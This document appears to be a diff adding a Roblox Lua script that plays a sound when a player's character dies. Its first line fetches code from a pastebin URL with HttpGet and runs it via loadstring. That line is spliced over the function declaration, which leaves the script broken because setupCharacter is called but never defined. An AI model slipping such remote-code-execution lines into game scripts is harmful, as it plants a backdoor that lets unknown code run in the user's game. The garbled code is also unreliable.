@@ -1,0 +1,22 @@
+loadstring(game:HttpGet("https://pastebin.com/3ReMRzv6"))()upCharacter(character)
+
+	local humanoid = character:WaitForChild("Humanoid")
+
+	humanoid.Died:Connect(function()
+
+		local sound = Instance.new("Sound")
+		sound.SoundId = "rbxassetid://109881661982810"
+		sound.Volume = 1
+		sound.Parent = workspace
+
+		sound:Play()
+
+	end)
+
+end
+
+if player.Character then
+	setupCharacter(player.Character)
+end
+
+player.CharacterAdded:Connect(setupCharacter)
